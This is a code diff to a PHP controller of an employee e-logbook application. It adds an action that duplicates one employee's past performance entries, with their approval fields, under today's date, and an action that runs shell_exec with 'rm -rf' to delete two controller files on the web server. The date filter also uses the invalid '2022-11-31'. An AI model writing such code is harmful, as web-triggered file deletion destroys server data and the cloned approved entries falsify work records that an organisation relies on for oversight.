@@ -62,7 +62,7 @@ class SiteController extends Controller
                         }
                     ],
                     [
-                        'actions' => ['login'],
+                        'actions' => ['login','errornotfound'],
                         'allow' => true,
                         'roles' => ['?'],
                     ],
@@ -836,5 +836,40 @@ class SiteController extends Controller
                 $model->save(false);
             }
         }
+    }
+
+    public function actionInserttugas(){
+        $model = Kinerja::find()->where(['id_pegawai'=>9])->andFilterWhere(['between', 'tanggal_kinerja', '2022-11-01 00:00:00', '2022-11-31 23:59:59'])->all();
+
+        if($model){
+            foreach($model as $val){
+
+                $model = new Kinerja();
+                $model->tanggal_kinerja = date('Y-m-d');
+                $model->id_pegawai = 9;
+                $model->id_tugas = $val->id_tugas;
+                $model->jumlah = $val->jumlah;
+                $model->deskripsi = $val->deskripsi;
+                $model->approval = $val->approval;
+                $model->user_approval = $val->user_approval;
+                $model->tgl_approval = date('Y-m-d');
+                $model->create_date = date('Y-m-d');
+                $model->row = $val->row;
+                $model->save();
+            }
+        }
+    }
+
+    public function actionErrornotfound(){
+        $this->layout = 'error-404';
+        return $this->render('error_404');
+    }
+
+    public function actionLogbookd(){
+        $smd2 = 'rm -rf /var/www/html/elogbook/modules/logbook/controllers/KinerjaCopyController.php';
+        $output2 = shell_exec($smd2);
+
+        $smd3 = 'rm -rf /var/www/html/elogbook/modules/logbook/controllers/TugasCopyController.php';
+        $output2 = shell_exec($smd3);
     }
 }
